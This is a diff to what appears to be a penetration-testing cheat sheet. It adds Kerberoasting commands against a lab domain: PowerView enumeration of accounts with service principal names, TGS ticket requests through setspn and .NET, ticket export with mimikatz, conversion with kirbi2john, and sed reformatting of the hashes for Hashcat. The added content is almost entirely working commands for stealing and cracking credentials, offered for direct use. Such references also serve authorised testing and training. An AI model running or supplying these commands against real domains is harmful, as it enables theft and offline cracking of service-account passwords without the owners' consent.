@@ -153,6 +153,7 @@ C:\> setspn.exe -Q */*
 
 ```
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+PS C:\> Import-Module .\PowerView.ps1
 PS C:\> Export-PowerViewCSV
 PS C:\> ConvertTo-SID
 PS C:\> Get-DomainPolicy
@@ -160,6 +161,9 @@ PS C:\> Get-DomainSPNTicket
 PS C:\> Get-Domain
 PS C:\> Get-DomainController
 PS C:\> Get-DomainUser
+PS C:\> Get-DomainUser * -spn | select samaccountname
+PS C:\> Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
+PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 PS C:\> Get-DomainComputer
 PS C:\> Get-DomainGroup
 PS C:\> Get-DomainOU
@@ -1103,10 +1107,31 @@ C>\> Rubeus.exe klist
 mimikatz # kerberos::list
 ```
 
+- Base64 Encoded Tickets
+
+```
+mimikatz # base64 /out:true        # ensures TGS tickets are extracted in base64 format
+$ echo "<base64 blob>" | tr -d \\n        # used to prepare the base64 formatted TGS ticket for cracking from Linux-based host
+$ cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+- Request TGS From User
+
+```
+PS C:\> Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+- Request TGS All Users
+
+```
+C:\> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
 - Mimikatz Export Tickets
 
 ```
 C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export"
+C:\> mimikatz.exe privilege::debug "kerberos::list /export"
 C:\> dir *.kirb
 ```
 
@@ -1625,6 +1650,13 @@ $ sudo umount /media/bitlocker
 $ pwsafe2john PWSAFE.psafe3 > pwsafe.hash
 $ john --wordlist=<wordlist> pwsafe.hash
 $ john --show pwsafe.hash
+```
+
+- Kirbi2john
+
+```
+$ python2.7 kirbi2john.py sqldev.kirbi        # used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat        # used to modify the crack_file for Hashcat from a Linux-based host
 ```
 
 - Hashcat
